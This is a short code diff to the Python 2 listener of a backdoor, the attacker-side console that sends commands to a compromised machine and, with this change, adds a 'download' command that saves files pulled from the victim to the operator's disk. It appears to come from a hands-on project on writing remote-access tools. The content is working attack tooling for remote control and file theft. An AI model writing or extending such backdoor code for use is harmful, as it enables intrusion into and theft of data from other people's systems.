@@ -38,12 +38,23 @@ class Listener:
 
         return self.reliable_receive()  # Receiving output from backdoor
 
+    # Take a remote file to write on system
+    def write_file(self, path, content):
+        with open(path, "wb") as file:  # Write Binary file
+            file.write(content)
+            return "[+] Download successful"
+
     # Take input
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")  # Take command as an array
             result = self.execute_remotely(command)
+
+            # Reverse command download
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
+
             print(result)
 
 
